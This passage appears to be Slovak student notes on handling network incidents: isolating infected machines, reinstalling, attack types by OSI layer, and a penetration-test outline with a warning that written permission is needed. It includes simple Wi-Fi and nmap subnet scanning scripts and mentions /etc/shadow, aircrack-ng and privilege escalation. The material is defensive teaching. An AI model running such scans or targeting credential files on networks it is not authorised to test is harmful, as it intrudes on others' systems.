2. Izolacia IZOLACIA INFIKOVANEJ CASTI SIETE - zabranenie sirenia

>[ !toolbox ] 
>POUŽI NÁSTROJE: CONTENT FILTER, IPS na LAN, BLACKLIST, 
>vypnutie sluzieb, portov,
>odpojenie zo siete - COMMAND AND CONTROL

Sledovanie jeho komunikacie pomocou IDS - CUSTOM SIGNATURE

3. Dezinfekcia pomocou AV

4.  REINSTALACIA - Admin pristup, Manipulacia so systemovymi subormi, Backdoor, nestabilita, Pochybnosti

5. ANALYZA UCINNOSTI A PLANU

## A.4 - HACKER NA CHRANENEJ SIETI

FYZICKA VRSTVA - SNIFFING 
DATA LINK - SPOOFING
SIETOVA - MITM
TRANSPORTNA - RECON  (PRIESKUM)
SESSION - HIJACKING (UNOS)
PREZENTACNA - PHISHING
APLIKACNA - EXPLOITACIA

>[!info] PENETRACNE TESTY !!!
PRISTUP DO USERA>ZISKAJ ROOT PRAVA>PREHLADAJ>ZABETONUJ (ABY ZOSTAL TVOJ)

>[! warning] 
>AK CHCETE UROBIŤ PENETRAČNÉ TESTY MUSÍTE MAŤ PISOMNE POVOLENIE SO ŠPECIFIKÁCIOU TESTOV A ČASOVÝM OBDOBÍM KEDY BUDÚ VYKONANÉ!!!



PREVENCIA:

Vsetko co sme sa doposial ucili. 

1. neopravneny scan  - ids, pcap, logy

2. brute force attack - ids, pcap, logy  KODY /etc/passwd, /etc/shadow

3. neopravnena wifi - aircrack-ng


#### LINUX PYTHON SKRIPT NA VYPISANIE NAJDENYCH WIFI SIETI
```python
import subprocess

def scan_wifi():
    cmd = "nmcli dev wifi list"
    networks = subprocess.check_output(cmd, shell=True)
    networks = networks.decode("utf-8")
    return networks

print(scan_wifi())
```
SPUSTIME:
``` bash
spustime python3 wifi_scan_linux.py
```

LINUX BASH SKRIPT NA SKENOVANIE WIFI kazdych 300 sekund {5 minut} uklada do suboru
``` bash
#!/bin/bash

while true; do
    nmcli dev wifi list >> wifi_list.txt
    sleep 300
done
```

SPUSTIME NA POZADI:

``` bash
sh ./wifi_scan_bash.sh &
```

>[!info] 
>Uloha spustena na pozadi sa objavi v zozname procesov pomocou prikazov ```ps```, ```top``` alebo pomocou prikazu ```jobs```. <br><br> Do popredia ulohu dostaneme pomocou prikazu ```fg``` a ukoncime `Ctrl-c` alebo ju nechame `Ctrl-z`. <br><br>Ak mame PID mozeme proces ukoncit `kill PID`




4.neopravnene zariadenie na LAN - nmap
``` bash
nmap IP/24 > zoznam_zariadeni.scan  # scanuje subsiet 254 zariadeni
```


5. privilege escalation - logy

>[! warning ]
>HACKER: PRIVILEGE ESCALATION je technika pomocou ktorej utocnik ziskava vyssie PERMISSIONS a tym pristup k sluzbam a suboro. Cielom je samozrejme byt ROOT.  


OPATRENIA:

a. Identifikacia pocitacov kde bol hacker uspesne pripojeny

b. Izolacia siete a analyza aktivit hackera

c. Dezinfekcia a reinstalacia

>[!warning] 
>AK BOL HACKER NA POCITACI A NIE SME SI ISTY CO SA MU PODARILO A CO NIE... AK SA DA. SPRAVTE KOMPLET REINSTALACIU NA NOVY HDD ALEBO SDD {NAJLEPSIE ESTE ZABALENY} !!! <br>
>VYMONTOVANY HACKNUTY DISK ODLOZTE PRE POTREBY POLICIE A FORENZNEHO SKUMANIA !!!  OZNACTE HO AKO JED AJ S ID CISLOM POCITACA :)


